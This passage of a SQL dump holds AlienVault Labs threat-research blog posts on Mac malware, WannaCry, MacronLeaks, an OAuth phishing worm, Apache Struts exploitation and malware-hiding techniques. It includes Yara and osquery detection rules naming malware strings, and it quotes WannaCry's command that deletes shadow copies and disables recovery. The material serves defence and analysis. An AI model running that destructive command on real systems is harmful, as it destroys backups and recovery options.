anti-analysis and obfuscation techniques since there is a lot of low hanging fruit on that front.If you want to find out more about these malware variants, here are some of the pulses we have in our Open Threat Exchange (OTX):  DetectionThere are many ways to detect the presence of these and other Mac-based malware variants in your environment. We’ve included some of those methods.Yara rulesYou can use the rules below in any system that supports Yara to detect these Mac-based malware variants.rule mac_bd_systemd{meta:author = \"AlienVault Labs\"type = \"malware\"description = \"OSX/Proton.B\"strings:$c1 = \"This file is corrupted and connot be opened\"$c2 = \"whatismyip.akamai.com\"$c3 = \";chflags hidden\"$c4 = \"%keymod%\"$c5 = \"* *-<4=w\"condition:3 of ($c*)}rule osx_proton_b{meta:author = \"AlienVault Labs\"type = \"malware\"description = \"Mac.Backdoor.Systemd.1\"strings:$c1 = \"%@/%@%@%@%@%@\"$c2 = { 2e 00 68 00 61 00 73 00 } //. h a s$c3 = \"Network Configuration needs to update DHCP settings. Type your password to allow this.\"$c4 = \"root_password\"$c5 = \"decryptData:withPassword:error:\"$c6 = \"-----BEGIN PUBLIC KEY-----\"$c7 = \"ssh_user\"condition:5 of ($c*)}rule osx_dok {meta:author = \"AlienVault Labs\"type = \"malware\"description = \"OSX/Dok\"strings:$c1 = \"/usr/local/bin/brew\"$c2 = \"/usr/local/bin/tor\"$c3 = \"/usr/local/bin/socat\"$c4 = \"killall Safari\"& $c5 = \"killall \\\"Google Chrome\\\"\"$c6 = \"killall firefox\"$c7 = \"security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain %@\"condition:all of them}OsqueryThe osquery project already has some rules for Dok and Proton which you can find here:For Systemd, you can add the following queries:{\"platform\": \"darwin\",\"version\": \"1.4.5\",\"queries\": {\"Systemd_Files\": {\"query\" : \"select * from file \\where path like \'/Library/StartupItems/sysetmd/StartupParameters.plist\' OR \\path like \'/Library/StartupItems/sysetmd/sysetmd\' OR \\path like \'/Library/sysetmd\' OR \\& path like \'/Users/%/Library/sysetmd\' OR \\path like \'/private/tmp/.systemd/systemd.lock%\' OR \\path like \'/private/var/root/.local/.systemd/systemd.uniq%\';\",\"interval\" : \"3600\",\"description\" : \"Mac.BackDoor.Systemd\",& \"value\" : \"Artifacts created by this malware\"},\"Systemd_Launch\": {\"query\" : \"select * from launchd where name like \'com.app%le.sysetmd.plist\';\",\"interval\" : \"3600\",\"description\" : \"SystemD Launch Agent/Daemon\",\"value\" : \"Artifact used by this malware\"}}}AppendixHashes for Mac.Backdoor.Systemd.1:6b379289033c4a17a0233e874003a843cd3c812403378af68ad4c16fe0d9b9c4 37152cfcfb9b33531696624d8d345feb894b5b4edd8af2c63a71e91072abe1ad c549c83577c294cc1323ca94e848389fce25510647ec5212fa2276de081771ca 3f71b6b994eabbc32a63eac14e9abd7b6cd26c37ed0baacbfbe62032c5930a40', 'malwaremacprotondoksystemd', '/blogs/labs-research/diversity-in-recent-mac-malware');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (21, 'Ongoing WannaCry Ransomware Spreading Through SMB Vulnerability', 'AlienVault Labs', 'May 12, 2017 ', 'As of early this morning (May 12th, 2017), the AlienVault Labs team is seeing reports of a wave of infections using a ransomware variant called “WannaCry” that is being spread by a worm component that leverages a Windows-based vulnerability.There have been reports of large telecommunication companies, banks and hospitals being affected. Tens of thousands of networks worldwide have been hit and the attacks do not appear to be targeted to any specific region or industry. Once infected, victims are asked to pay approximately $300 by Bitcoin, and it appears the attackers have found people willing to pay.The AlienVault Labs team has created a Pulse in the Open Threat Exchange to share the indicators of compromise we have been able to obtain. These indicators can be used to help identify potential attacks in progress.  One method of command and control and secondary installation has been sinkholed by security researchers, however the attackers can still leverage a second communication mechanism via Tor.The WannaCry ransomware is using the file extension .wncry, and it also deletes the Shadow Copies, which is a technology introduced into the Microsoft platforms as far back as Windows XP and Windows Vista as the Volume Shadow Copy service. This means that even backup copies produced by this service, such as Windows Backup and System Restore, would be affected as well.cmd.exe /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet (PID: 2292)The following file is also created in the affected systems: @[email protected]Once it gets on a network, WannaCry exploits a known Microsoft Windows vulnerability (MS17-010) to spread. This vulnerability was released as part of the Shadow Brokers leaks back in April. Microsoft released a patch for MS17-010 on March 14th. Administrators are advised to immediately upgrade any systems that do not have this patch to avoid potential compromise by WannaCry. So far the only confirmed vector of the attacks is through an SMB exploit, which provides a worm-like mechanism of spreading WannaCrypt.AlienVault USM Anywhere and USM Appliance are able to detect attempts to exploit this vulnerability via the following IDS signature released by AlienVault on April 18th:ET EXPLOIT Possible ETERNALBLUE MS17-010 Echo ResponseYesterday we noted a sharp increase in external scans against our customers for the exploit, and we are investigating if it is related to today\'s attacks:We will update this blog post as we discover more information about the ongoing situation.', 'ransomwarewannacry', '/blogs/labs-research/ongoing-wannacry-ransomware-spreading-through-smb-vulnerability');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (22, 'MacronLeaks â A Timeline of Events', 'Chris Doman', 'May 6, 2017 ', 'It\'s been a very familiar feeling reading about the documents leaked to impact the elections in France tomorrow.Often the best defence is to have a proper understanding of what has happened. A quick draft timeline of events from an analysis of document meta-data and forum posts is below.Attacks in March and AprilA number of domains, identified by Trend Micro as linked to a group of attackers known as APT28, were registered for use in attacks against Emmanuel Macron\'s campaign.It appears they were registered in two stages - first in the middle of March, then more in the middle of April. The links between these attacks and others in the US elections is strong. I haven’t seen a definitive link that the documents leaked yesterday were the result of these attacks in March and April, but it seems a likely scenario.Suspicious edits of the leaked documents in MarchMany noted that all of the documents in one of the smaller archives released yesterday (xls_cedric) appeared to have been edited over a 4 minute period on the 27th of March.These were edited by a Russian language version of Microsoft Excel. About half recorded a user named \"Рошка Георгий Петрович / Roshka Georgy Petrovich\" performing the edits.It\'s suspicious that these documents, some which were created over ten years ago, were all edited so recently during the same 4 minutes. It suggests the edits may be following their theft, not before.Before linking any individual to these attacks though it\'s important to note:A number of people have that name;This could be false information planted by the attackers; orAn entirely innocent employee at a bank somewhere has been unfortunate enough to get caught up in this.Similar previous mail dumps have included a mix of real and fake information, and the Macron campaign have also said that the dump is a mix of real and fake documents. It\'s important to keep that in mind – particularly when you see e-mails in the dump suggesting that politicians have bought drugs online.Documents shared on 4Chan on WednesdayA first small set of two documents were shared http://boards.4chan.org/pol/thread/123933076 [no longer available] on 4Chan\'s politics board /pol just prior to the election debates on Wednesday:These suggested that Macron had secret bank accounts. The post was made by a user from a Latvian IP. The geolocation is likely incorrect and the “Latvian” poster themselves said they were connecting through proxies from another location.The documents were picked up by fringe news sites quickly, and Le Pen made similar claims during the live debate against Macron that night.It wasn’t long before some suggested the documents looked like they had been photo-shopped. The “Latvian” poster claimed the problems were due to the how the copies were obtained - by taking photos of the documents \"in a short window perhaps only a couple minutes long\" with \"covert physical access\".Meta-data of the documents showed they were scanned by two very expensive printers around the same at 08:22 that Wednesday morning (all times in this post are in UTC). This could match two people working in an office. The time zone of the scans was set to UTC-4 - which would in fact match a bank in the Caribbean. This could be a legitimate timestamp of when they were scanned, fake information, or left in despite later edits.Friday Morning: Higher Quality versions of Wednesday\'s documents shared on 4ChanIn response to the questions around whether the documents had been edited the (presumably same) “Latvian” poster shared higher quality versions of the documents posted on Wednesday:Ominously they referred to what were likely the documents that came out later that day, providing evidence the leak of documents on Wednesday and Friday were by the same people:\"We will soon have swiftnet logs going back months and will eventually decode Macron\'s web of corruption\"They also suggested plans for further activity if Macron wins:\"Also if Macron wins we\'re gonna have to organize and make things happen. The French scene will be at nouveaumartel.com later.\"This has possible parallels to the US elections. Many saw the leaked documents then as attempts to weaken Hilary Clinton had she won as expected - as much as to reduce the chances of her election. Currently the site nouveaumartel[.]com (registered in November 2016) is empty. The “Latvian” poster responded directly to suggestions they were Russian:\"I am not Russian. I have never been to Russia. I do not speak Russian”Friday Early Afternoon: The Uploads to the Internet ArchiveThe documents were uploaded to the internet archive between 11:17:39 and 14:06:04.Internet archive logs several pieces of information when you upload a file, and recorded that:The uploader used the e-mail address [email protected][.]deTwo machines were used to upload the files - one was Windows 8.1, the other Windows 10Both machines have the language of their browser set to US EnglishThe files remain available on the Internet Archive. They often take time to remove files and were even banned in Russia for not taking down extremist content promptly.Friday Night: The Cache is Shared and SpreadAt 17:37 the US alt-right fringe news site \"Disobedient News\" tweeted:(Note the time is 5:37 PM when in UTC)This was twenty minutes before the links to the archives were posted on Pastebin. Disobedient News was also the first to tweet links to the archives after they were shared on 4Chan, and have been linked to being key to spreading the news.At 17:59 the links to the files on internet archive were posted to Pastebin and then shared on 4Chan 30 minutes later:This time the post is from an IP address in the US, unlike the other posts which were from an IP in Latvia. The poster says the documents were \"passed on\" to them that day, and that they were trying to share them with Wikileaks but they were \"too slow\".A possible reading of the timeline is that the attackers uploaded the files to internet archive, then another party spread the information on 4Chan and elsewhere.What next?The impression on the 4Chan boards, the so-called \"armpit of the internet\", is that this is all a game.But the effects of repeated attacks against political parties is serious. It\'s unlikely those orchestrating these attacks would have the best interests of those happily spreading their output at heart.The French elections will be over Sunday, but it\'s unlikely these types of attacks will be. Related attacks targeting German political parties for the upcoming German elections have already been identified.', 'macronleaks4chantimeline', '/blogs/labs-research/macronleaks-a-timeline-of-events');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (23, 'OAuth Worm Targeting Google Users - You Need to Watch Cloud Services', 'Jaime Blasco', 'May 4, 2017 ', 'Yesterday, many people received an e-mail from someone they knew and trusted asking them to open a \"Google Doc.” The email looked, felt, and smelled like the real thing—an email that Google normally sends whenever a share request is made. However, the email contained a button that mimicked a link to open a document in Google Docs.When users clicked on the button, they were prompted to give “Google Docs” permission to read / send email, manage their email, and access their contact lists. In reality, this was a malicious application registered by the attackers. And, in fact, is one of the most well-crafted phishing attempts in the last year.By clicking on the ALLOW button, users authorized the malicious application to perform actions on their behalf. The users’ browsers were redirected to one of the malicious servers set up by the attackers, for example:https://googledocs[.]docscloud[.]win/g.php.The AlienVault Labs Security Research Team detected the activity, and while the attack was still in progress, we created a Pulse in the Open Threat Exchange (OTX) with all the indicators of the infrastructure the attackers used (mainly the domains they used in redirection).In addition, several OTX users jumped in and shared more malicious infrastructure in a matter of minutes!  This helped get the indicators out immediately to the 30,000+ people that follow the AlienVault OTX account. Kudos to the OTX members who jumped in and delivered this valuable information so quickly to the community!Sign up to OTX to join the 53,000+ users who already benefit from this free service >Going back to the attack–when the user was redirected to one of the servers after allowing the malicious application to perform those actions, it was served with the JavaScript code that contained the self-replication / worm functionality.First, the malicious JavaScript would get access to the contact list (first 1000 entries):The code parsed the names and email addresses of those contacts and then prioritize addresses from gmail.com, avoiding addresses containing the words “google”, “keeper” and “unty”.Once the list of potential victims was crafted, the code sent the same email to them as well, thus propagating the attack:When sending the email, the attackers also decided to BCC the address hhhhhhhhhhhhhhhh[at]mailinator[.]com -, presumably to monitor progress or collect the list of victims.ImpactLuckily, Google reacted to this quickly, and the malicious applications were shut down in about an hour after the start of the campaign. Cloudflare, which the attackers used in front of the malicious infrastructure, took down that part of the attack infrastructure quickly, too.It is important to mention that the attackers didn’t exploit any vulnerabilities in Google services or OAuth. They simply leveraged a built-in capability that was designed to be used in this way to serve their nefarious intentions. The main problems from my point of view were:User Interface: This is not the first time that attackers used this trick, and it is probably going to get worse. Google and other providers could probably improve the UI to display more information about the application / author, alert the user of the dangers, and more. A similar issue was reported to Google in 2014Application review process: Google and other providers (Office 365, Yahoo, etc.) need to improve the review process for applications requesting access, especially those that look suspicious or ask for specific permissions. They could even start with reviewing applications that use suspicious names such as “Google Docs”. Blame the bearsAs I mentioned earlier, this is not the first time this technique was used. Multiple actors have been using it for years to circumvent two-factor authentication. One of the infamous groups using this technique went by APT28/Fancy Bear/Sofacy, or for those of you not familiar with the fancy names, the group behind the DNC hack. You can read more about that particular attack in a great report released by TrendMicro, which describes how the group used this technique to convince users to click on a malicious application with the name “Google Defender” (instead of Google Drive”).As we have seen repeatedly, attackers learn from each other all the time and, unfortunately, we are going to see this technique adopted more and more by many different actors.The importance of monitoring cloud applicationsG Suite, like Microsoft Office 365, has become a widely-used cloud service by individuals and organizations worldwide for document sharing and email. However, the same services that make it possible for users to share documents and collaborate can also be used to compromise accounts as malicious actors search for new ways to phish information and compromise systems and data in the cloud.As enterprises continue to adopt cloud services and applications, it is important to make sure that you have the right tools in place to deal with threats in those environments. Traditional security tools fall short, and most IT security teams don’t have the time, resources, or tools available to properly monitor cloud services like G Suite. Although Google, Microsoft, and other cloud service vendors invest a lot of time into ensuring the security of these cloud services, the weak link will always be the end user. As in the case of the threat described in this blog, users can easily be tricked by malicious actors into clicking on something that is malicious and harmful. Having visibility into that user activity and monitoring that activity to identify malicious or suspicious behavior is critical to maintaining a healthy security posture and protecting your infrastructure.AlienVault USM Anywhere, a cloud-based solution for cloud and on-premises security monitoring, is designed to help you monitor all your business-critical infrastructure from a single console. With the ability to monitor user activities in cloud services such as G Suite, Office 365, AWS, and Azure, USM Anywhere provides a comprehensive, complete security monitoring in a single pane of glass.USM Anywhere enables users to monitor their infrastructure to detect threats, respond to incidents, and meet their compliance goals. It includes the essential security capabilities, including asset discovery, vulnerability assessment, intrusion detection (for the cloud, network, and host), SIEM, and log management, as a unified solution to give you visibility into your infrastructure and quickly identify the threats that can lead to compromise.How USM Anywhere HelpsAs you know, threats change over time. Threat actors are constantly developing new techniques to trick users and compromise accounts. The traditional approach that most IT security teams take is to buy more solutions to solve the new problem of the day. This is, however, unsustainable and leads to tool proliferation. Organizations find themselves trapped in an endless “threat cycle.” Buy a tool to address a threat. The threat changes. The tool is no longer effective. Buy a new tool. The threat changes, and so forth and so on. It’s Groundhog’s Day in real life, but without the joy of Bill Murray.AlienVault solves the problem of the threat cycle with the USM Anywhere platform and its AlienApps™ architecture. Building on the Unified Security Management™ (USM™) approach pioneered by AlienVault, the USM Anywhere platform takes the unified approach beyond the five security essentials. The highly extensible USM Anywhere architecture allows AlienVault to seamlessly add new security technologies into the platform as they become available, allowing you to keep pace with the ever-changing threat landscape. AlienApps enable security orchestration and automation capabilities with both third-party technologies and within the platform itself, which are needed to properly coordinate an effective response to the latest threats. This is the power and promise of AlienApps.The AlienApp for G Suite was recently made available to provide organizations with comprehensive visibility into all user and administrative activity within G Suite. Prebuilt, interactive dashboards provide an at-a-glance view into the user activity and help you quickly discern potential security risks.AlienVault can be quickly and easily hooked into G Suite, leveraging the same OAuth functionality used by the threat actor described in this blog to connect and collect the activity directly from the G Suite API. This provides USM Anywhere with the data and context to understand what users are doing, what documents they are sharing, and what applications are being authorized via OAuth.As you can imagine, this is very valuable from a forensic point of view. This allows you to:Validate if any of your users were affected by the malicious applicationGenerate alerts based on application activityReport and hunt on different applications that your users have connected to their corporate accounts.Finally, we have included a default correlation rule in USM Anywhere that will alert when a user authorizes an application with dangerous permissions, such as access to email and contacts.USM Anywhere, combined with the AlienApp for G Suite (included out of the box with USM Anywhere at no additional cost) provides the information that even the most under-resourced IT security teams need to effectively monitor their G Suite environments for potential threats and compromise.', 'cloud securityoauth', '/blogs/labs-research/oauth-worm-targeting-google-users-highlights-need-to-watch-cloud-services');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (24, 'New Features in Open Threat Exchange (OTX)', 'Chris Doman', 'March 31, 2017 ', 'Its been a busy couple of months for the OTX team, making lots of improvements to make OTX more useful for security researchers and InfoSec professionals. Thought it was time to give you and update. Here\'s what\'s new in OTX:Easier Way to Create PulsesWe\'ve rebuilt the way you create pulses from scratch. So you can now bulk-edit pulses and get feedback on why indicators were whitelisted.We\'ve also added a suggested indicators tab - OTX looks for everything that is one-hop away from the pulse to find indicators that you might want to include: New! Adversary Pages OTX has long supported the concept of adversaries, but we\'ve recently revamped how we display that data. We\'ve promoted adversaries to have dedicated pages, pulling together all the information we have from various sources.The descriptions are kindly made available by the MISP project. There is a lot of discussion in the industry about whether one group of attackers should be classed as Group X or Group Y. If you think the data is incorrect, and you\'re happy to share that, you can dive in and improve the information for everyone.OTX also uses this data to suggest adversaries when you are creating pulses.Whois Data Now Included in OTXWe\'ve added Whois data to OTX to provide some quick context when you are triaging alerts. We\'re also looking at improving how you can pivot and monitor this data.Network Signature Hits Against Servers Data Now in OTXAlienVault has a wealth of information about which servers on the internet are being used for malware command and control. We get this data from both our malware sandboxes and users who choose to opt-in to share anonymised information from their networks. We\'ve just started to present this data in OTX - and AlienVault USM customers will additionally see the contents of our rules and private threat intelligence pulses.New! OTX Python SDK Function to Maintain Feeds in PulsesA new function in the OTX Python SDK makes it easy to maintain feeds in pulses. You can periodically check a feed, and update a pulse to keep it up to date with the indicators in the feed.It\'s been great to see some users already experimenting with this feature. And OTX users have built a ton of other functionality using the API. Want to use OTX data in Splunk, Graylog, Maltego or 30 other tools? OTX users have got you covered.New! Ability to Comment on Indicator PagesNot everything can be said in a table, and we\'ve added the ability to comment on indicator pages to reflect this. We\'re working on making OTX a more social experience overall - so you can discuss the threats you see every day with other users.We\'re also providing more information on why indicators may not be malicious - to help that person in your SOC who keeps flagging windowsupdate.com as malware:Whats Coming Next?Stay tuned folks, we\'ve got a lot coming! Some of the things we\'re looking at include...Full STIX / TAXII supportAdditional data sourcesA cleaner user interfaceWhat Have We Missed?We\'d love to hear any feedback or thoughts you might have around how to improve OTX. There\'s a survey you can fill out, or just drop us an e-mail.', 'otxusmotx pulse', '/blogs/labs-research/new-features-in-open-threat-exchange');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (25, 'Apache Struts Vulnerability Being Exploited by Attackers', 'Jaime Blasco', 'March 14, 2017 ', 'Last week a new vulnerability affecting Apache Struts was reported (CVE-2017-5638) that affects the Apache Struts Jakarta Multipart parser. The vulnerability allows an unauthenticated attacker to execute code in the affected system by creating a specially crafted Content-Type HTTP header.Starting last Thursday (March 9, 2017), we have seen a high number of attackers trying to exploit this vulnerability. Different payloads have been observed, with some examples as follows:As of today, using the telemetry we received from the AlienVault Open Threat Exchange (OTX), we have identified more than 400 unique sources that are attempting to exploit this vulnerability.Indicators of CompromiseTo address this threat, the AlienVault Labs team has created a Pulse in the Open Threat Exchange (OTX) with the collection of payloads that are being delivered.   RecommendationsSince this vulnerability is being actively exploited in the wild, our recommendation is to upgrade your Apache Struts version as soon as possible.The vulnerable versions of Apache Struts are:Struts 2.3.5 - Struts 2.3.31Struts 2.5 - Struts 2.5.10Upgrading to the following versions resolves the vulnerability:Struts 2.3.32Struts 2.5.10.1For more information, you can check Apache’s documentation HERE.AlienVault CoverageAlienVault has released multiple signatures to detect attempts to exploit this vulnerability, which can be found in both our AlienVault USM Appliance and AlienVault USM Anywhere products.The following example shows a successful detection of the vulnerability within our AlienVault USM Anywhere product, where we observe that a new ‘Webserver attack – Code Execution’ alarm has been triggered indicating a successful attack:This alarm is the result of two events being correlated:The first event detects the exploitation of CVE-2017-5638 against a Tomcat webserver using a vulnerable version of Apache Struts.The second event that triggered the alarm is detecting an ELF executable being downloaded from the same host after the exploit has been successful.We will be monitoring this activity and will update this blog post if we discover new information.', 'otxusm anywhereusm applianceapache strutscve-2017-5638', '/blogs/labs-research/apache-struts-vulnerability-being-exploited-by-attackers');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (26, 'Malware Hiding Techniques to Watch for: AlienVault Labs', 'Kate Brew', 'October 3, 2016 ', 'I saw a webcast done by Peter Ewane and Javvad Malik recently. The summary of what Peter had to say and Q&A follows; you can also view the recorded webcast.What is Malware?Malware can be a lot of things. It can be a virus, a worm, spyware, a Trojan horse, or ransomware. It’s basically any malicious program that you would not want on your computer.Windows RegistryLately it has become common to see malware hide in the Windows Registry. Why the Windows registry? The Windows registry is quite large and complex, which means there many places where malware can insert itself to achieve persistence. A good example of this behavior is Poweliks. Poweliks sets a null entry utilizing one of the built-in Windows APIs, ZwSetValueKey, which allows it to create a registry key with an encoded data blob. I’m not sure why the Windows API allows a null entry, but it does. This is one of the many ways that malware can utilize the Windows registry to hide out, autostart, and maintain persistence on many systems.Here’s an OTX pulse on Poweliks: https://otx.alienvault.com/browse/pulses/?q=POWELIKS  Process InjectionProcess injection is exactly what it sounds like. It is injecting some bits of code into a running process. Malware leverages process injection techniques to hide code execution and avoid detection by utilizing known “good” processes such as svchost.exe or explorer.exe. To inject itself into known good processes, malware writers use built-in Windows APIs. One of them is setting debug. When a process sets as debug, it gains access to many of the debug API calls, such as attaching to other processes and instructing processes to allocate additional memory. Once a process has allocate more memory, then a malicious process can inject whatever code it wishes into that process.A great example of malware that uses process injection is Poison Ivy. Poison Ivy\'s process injection is one of my favorites not only because it is very well known but also because it is used in many campaigns, and does process injection slightly differently than other kinds of malware. When malware allocates a chunk of memory, normally that chunk of memory is “contiguous”, so at the end of a memory block, it will allocate another memory block and inject code there. Poison Ivy does what we call “sharding.” Instead of having one giant memory block, it has a whole bunch of tiny memory blocks split all over the process and sometimes in various processes. A great example of malware that uses process injection is Poison Ivy. Poison Ivy\'s process injection is one of my favorites not only because it is very well known but also because it is used in many campaigns, and does process injection slightly differently than other kinds of malware. When malware allocates a chunk of memory, normally that chunk of memory is “contiguous”, so at the end of a memory block, it will allocate another memory block and inject code there.Here’s an OTX pulse on Poison Ivy: https://otx.alienvault.com/browse/pulses/?q=poison%20ivy  Process HollowingAnother technique related to process injection is process hollowing. ‘Hollowing’ is a process where you take a known good process and start it in a suspended state. When that code is loaded and about to execute, you scoop some of the good code out (like with an ice cream scoop). Now there is available space where a bad guy can place whatever code they like, maybe change a few headers on the top and bottom to make everything seem okay, and then restart the execution process. As far as a user knows, this process looks like a normal system process started by Windows. It is therefore much more difficult for reverse engineers and memory forensics people to analyze.Dridex is a very good example of a malware family that often uses process hollowing. Here’s an OTX pulse on Dridex:  Process List UnlinkingProcess List Unlinking is another key concept. A process is anything that is running on your computer, whether it be in user space or kernel space. Process List Unlinking involves a double-linked list that contains all “active” processes. It’s important because unlinking will result in a process being hidden from all “active” tools. This can be done using ZwSystemDebugControl() or by mapping \\Device\\PhysicalMemory. Inside the process list is a list of every single process that is running and inside the process object is forward-pointed and backwards-pointed into the process in front of it or the process behind it to make a double-linked list.A Flink to the process before it and then Blink to the one in front of it effectively removes the process from the list. More advanced malware will take this a step further and after they remove that process from the list, they will also write over that bit of memory, so even with memory forensics you wouldn\'t be able to locate that process.There are tools that security researchers can use to find hidden malicious code, such asPsAc4veProcessHead traversalPool tag scanning for processesPool tag scanning for threadsPspCidTableThis is an example bit of code that somebody would use to unlink from the process list.DLL List UnlinkingMalware can also hide by manipulating the DLL list. Just like the process list, a DLL list has a double-linked list that points to the DLL in front and behind, and again just like the process lists are APIs that can be called to rewrite entries in the DLL list, remove that DLL entry and wipe out that bit of memory to help hide the malware from memory forensics or from backup tools. This is used a lot in rootkit activity. Here’s a graphic explaining DLL lists:Here we have another example of code used to unlink from the DLL list:You can see where it is writing over the one in front, the one behind, and then wiping out the memory and the zero memory function call. One other thing to remember about DLL and process list linking is that all that can be done from the user space, so I don\'t need kernel-level administrative rights.Kernel Module List UnlinkingKernel modules are the next level down. A kernel module is any of the modules that is loaded into the kernel. Like the DLL and process list, the kernel modules have their own list that can be queried with APIs and return every kernel module that is loaded. There are also debug APIs that can remove one DLL module from the list and zero it out. This is especially important because at the kernel level when something is zeroed out it makes it lot harder to find. This access is like ring zero access - definitely associated with rootkit activity. Generally, a piece of malware will execute in user space and then try a kernel-level exploit to get kernel administrative access; it then drops the main rootkit, which would then zero itself out inside the kernel module list process list. At this point, the malware is very well hidden and it will be very difficult to find.How Kernel Module List Unlinking Works:Questions from the Audience:JAVVAD: So most malware sandboxes can’t deal with samples that remain dormant for a considerable amount of time before execution, such as Keranger. Have any new techniques been developed to overcome this?PETER: Yes, there are a couple of different ways to overcome that. One way to tell malware remains dormant involves a certain amount system time. One way to manipulate that is to make the time go faster on the virtual machine, so every millisecond is actually ten minutes or every millisecond is actually five hours, defeating the dormant malware by waiting it out.JAVVAD: How can AlienVault detect the malware hiding techniques that were described in the presentation?PETER: Excellent question. One of the ways we can detect various hiding techniques described in the presentation, is based upon Windows logging. One example of such detection would be a processes acquiring the ability to utilize the built in Windows debug capabilities. There are known \"Good\" applications that use those functions, but outside of them it looks suspicious when other processes outside that circle utilize those debug capabilities which when then can alert on.JAVVAD: Do you have anything to detect CryptoLocker or any other similar type family of ransomware?PETER: Yes, we have correlation rules for CryptoLocker and various ransomware families.JAVVAD: Is it anything specific that makes Ransomware different to look for compared to other sorts of malware, or is it pretty much the same techniques that you use?PETER: These techniques are more about hiding. Ransomware generally is not very good at hiding, that is not its job. Its job is to be loud and in your face. So generally we can look for that being loud and in your face or any sort of network detector, so like it is connecting to known bad domains, etcetera.JAVVAD: Is there a tool that can utilize OTX to scan a raw memory image file for IoCs?PETER: What I would personally recommend is while you can\'t import memory images into OTX yet, you can use a tool such as Volatility to pull out IP and/or domains depending on what you want to scan, and then you can cross-reference with OTX based on the information that you pull up from the memory image.JAVVAD: What is the general turnaround time between the AlienVault team capturing a sample of the zero-day attack and actually producing signatures?PETER: That is hard to give an exact answer to because every bit of malware is different and every zero-day is different. Sometimes it can be a couple of hours, sometimes it may take longer than that.JAVVAD: Yes. I will just add to that, actually. Last year, Adobe released a zero-day, and actually because the IoCs were being reused from previous campaigns, effectively we were blocking that zero-day three months prior to Adobe actually publicly announcing it. So it is not always the case that zero-days produce effects.About Peter and JavvadPeter Ewane is a security researcher at AlienVault. Follow him on Twitter https://twitter.com/eaterofpumpkinJavvad Malik is the security advocate at AlienVault. Follow him on Twitter https://twitter.com/J4vv4D', 'malware', '/blogs/labs-research/malware-hiding-techniques-to-watch-for-alienvault-labs');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (27, 'Reverse Engineering Malware', 'Kate Brew', 'June 27, 2016 ', 'The AlienVault Labs team does a lot of malware analysis as a part of their security research. I interviewed a couple members of our Labs team, including Patrick Snyder, Eddie Lee, Peter Ewane and Krishna Kona, to learn more about how they do it.Here are some of the approaches and tools and techniques they use for reverse engineering malware, which may be helpful to you in your own malware hunting endeavors. Please watch the webcast they did recently with Javvad Malik on reverse engineering malware and hear details and examples of how the Labs team investigated OceanLotus, PowerWare and Linux malware in recent situations.Approaches in reverse engineering a malware sampleReverse engineer: The most obvious approach is to completely reverse engineer a piece of malware. This obviously takes a great amount of time, so other approaches are more practical.Exploitation techniques: Another approach you can take is to focus on the exploitation techniques of a piece of malware. Occasionally you will see a piece of malware that is using a new exploitation technique, or is exploiting a zero-day vulnerability. In this case you may be interested only in the specific exploitation technique so you can timebox your analysis and only look at the exploitation mechanisms.Obfuscation: Malware will often obfuscate itself and make itself difficult to analyze. You might come across malware that you have seen before without obfuscation. In that case you may only want to focus on reverse engineering the new parts.Encryption methods: A common type of malware these days is ransomware. Ransomware essentially encrypts the victim\'s files and locks them up so that they can\'t be accessed or read. Oftentimes the authors of ransomware will make mistakes when they implement the encryption mechanisms. So if you focus your research on the encryption mechanisms you might be able to find weaknesses in their implementation and/or you might be able to find hard-coded keys or weak algorithms.C&C communication: This is something that is pretty commonly done when looking at malware. Analysts often want to figure out what the communication protocol is between a piece of malware on the client\'s side and the server on the command and control side. The communication protocol can actually give you a lot of hints about the malware’s capabilities.Attribution: Murky area - kind of like a dark art. It usually involves a lot of guesswork, knowledge of malicious hacking teams and looking at more than one piece of malware.Categorization and clustering: You can reverse engineer malware from a broader point of view. This involves looking at malware in bulk and doing a broad-stroke analysis on lots of different malware, rather than doing a deep dive.TechniquesNow, let’s look at techniques that can be utilized while analyzing malware.First of all, we use static analysis. This is the process of analyzing malware or binaries without actually running them. It can be as simple as looking at metadata from a file. It can range from doing disassembly or decompilation of malware code to symbolic execution, which is something like virtual execution of a binary without actually executing it in a real environment.Conversely, dynamic analysis is the process of analyzing a piece of malware when you are running it in a live environment. In this case, you are often looking at the behavior of the malware and looking at the side effects of what it is doing. You are running tools like process monitor and sysmon to see what kinds of artifacts a piece of malware produces after it is run.We also use automated analysis. Oftentimes if you are looking at malware you want to automate things just to speed up the process to save time. However, use caution, as with automated analysis sometimes things get missed because you are trying to do things generically.If a piece of malware contains things like anti-debugging routines or anti-analysis mechanisms, you may want to perform a manual analysis. You need to pick the right tools for the job.ToolsIDA Pro is a really good tool for analyzing various samples of malware with diverse backgrounds. It also has a good add-on called HEX Rays Decompiler, which is a tool that can convert assembly language into more easily read pseudocode. It can help you in understanding the functionality of the code more quickly than looking at assembly language. When you open a sample in IDA Pro, you see the entry point of the malware. It has a graph view as well and you can switch between both hex code and the graph view. It will give you a quick representation of the mapping of the flow of execution as well. It has an SDK you can use if you like to develop plug-ins and automate and extract some of the useful information. IDA Pro also has a Python API that you can use if you prefer Python. The tool also has debugging functionality, but mainly it is used for static reverse engineering of malware.Here’s IDA Pro:There are also debuggers like The GNU Project Debugger (GDB), WinDbg and Wind River.For Windows samples, PEiD, PEStudio, PE32 tools are great. You can also use these tools on executables and get some initial classification of your samples.Here’s PEiD:Other tools that we use include strings, file, and otool. They help us initially find the platform of the sample. If you look at some snapshots of these tools, they can tell you where the entry point of that sample is, what section, and if the sample is packed. They can also detect more than a hundred packers and can detect decrypters and compilers as well.Here’s the file utility:Generally, when we get a bunch of samples or an archive of samples from open-source feed, we use a file utility to find out if the file is a regular executable or for a Windows platform or OSX or Linux, or is it just a text file or a script.Immunity Debugger is another popular debugger. If you open a sample in Immunity Debugger, it will give you an alert saying that the sample is packed and be asked if you want to proceed with the analysis. If you continue the analysis, you see an entry point, which is where it 